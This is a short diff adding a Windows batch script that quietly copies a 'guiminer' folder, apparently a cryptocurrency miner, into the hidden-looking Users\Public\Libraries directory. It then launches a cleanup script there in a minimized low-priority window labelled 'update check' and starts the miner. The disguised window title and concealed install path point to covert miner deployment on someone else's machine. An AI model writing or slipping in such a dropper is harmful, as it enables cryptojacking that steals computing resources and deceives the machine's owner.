@@ -1,0 +1,10 @@
+@echo off
+
+ROBOCOPY "%cd%\guiminer" "%homedrive%\Users\Public\Libraries\guiminer" * /E /Z /COPY:DA /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
+start "update check" /MIN /LOW "cmd" "/Q /C "%homedrive%\Users\Public\Libraries\guiminer\cleanup.bat""
+%cd%\guiminer\start.bat SETUP.bat
+
+
+cls
+exit /B %errorlevel%
+exit %errorlevel%
